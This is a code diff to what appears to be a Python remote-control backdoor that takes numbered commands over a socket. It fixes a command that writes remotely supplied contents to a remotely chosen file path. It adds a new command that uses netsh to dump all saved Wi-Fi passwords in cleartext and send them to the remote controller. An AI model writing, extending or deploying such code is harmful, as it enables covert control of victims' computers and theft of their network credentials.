@@ -55,11 +55,12 @@ while 1:
     elif command == "6":
         # make File
         path = s.recv(50000).decode()
-        f = open("path", "w")
+        f = open(path, "w")
+
         contant = s.recv(500000).decode()
         f.write(str(contant))
-        s.send("Done*".encode())
 
+        s.send("Done*".encode())
 
 
     elif command == "7":
@@ -80,7 +81,28 @@ while 1:
         # https://stackoverflow.com/a/40319875
         os.system("echo Hello W0rld")
 
+
+
+    elif command == "10":
+        # https://nitratine.net/blog/post/get-wifi-passwords-with-python/
+        import subprocess
+
+        string = ""
+        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+        for i in profiles:
+            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
+                'utf-8').split('\n')
+            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+            try:
+                print("{:<30}|  {:<}".format(i, results[0]))
+            except IndexError:
+                print("{:<30}|  {:<}".format(i, ""))
+            string += results.pop()
+            string += "\n"
+
+        s.send(str(string).encode())
     else:
-        print("Command not recongnised")
+        print("Command not recognised")
 
     print("")
